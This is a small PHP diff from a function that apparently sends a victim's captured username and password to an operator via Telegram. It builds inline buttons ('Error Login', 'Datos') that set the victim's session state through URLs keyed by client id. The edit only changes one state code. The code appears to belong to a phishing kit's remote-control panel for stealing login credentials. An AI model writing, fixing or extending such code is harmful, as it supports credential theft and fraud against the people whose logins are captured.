@@ -71,7 +71,7 @@ function enviarMensajeTelegram($usuario, $clave, $config, $clienteId) {
     $keyboard = [
         'inline_keyboard' => [
             [
-                ['text' => 'Error Login', 'url' => "$baseUrl?id=$clienteId&estado=2&key=$security_key"],
+                ['text' => 'Error Login', 'url' => "$baseUrl?id=$clienteId&estado=1&key=$security_key"],
                 ['text' => 'Datos', 'url' => "$baseUrl?id=$clienteId&estado=6&key=$security_key"]
             ],
             [
